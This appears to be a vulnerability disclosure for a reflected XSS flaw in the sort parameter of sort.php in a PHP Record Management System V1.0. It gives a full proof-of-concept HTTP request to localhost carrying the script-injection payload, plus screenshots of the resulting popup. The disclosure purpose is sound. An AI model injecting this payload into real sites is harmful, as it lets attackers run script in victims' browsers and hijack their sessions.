### VUL_AUTHOR:netmanzhang
# Record management system – reflected XSS on (sort.php sort parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
sort.php 

On this page, sort parameter is vulnerable to reflected XSS Attack 
## Proof of vulnerability:
### Request:
```
POST http://localhost/Personnel_record_management_system/sort.php HTTP/1.1
Host: localhost
Content-Length: 37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/Personnel_record_management_system/sort1.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=52388hjgjeif4bl4r5sqp2bmpm
Connection: close

sort=Sort+Personnel+by+School"><script>alert(1)</script>&filter=
```
## Payload：
```
"><script>alert(1)</script>
 ```
<img width="416" alt="image" src="https://github.com/user-attachments/assets/14d70a1a-a35d-4dbf-8302-d1910609afdc">

## Trigger popup：
<img width="416" alt="image" src="https://github.com/user-attachments/assets/5af54e8b-2842-4af0-adee-437b27204d08">

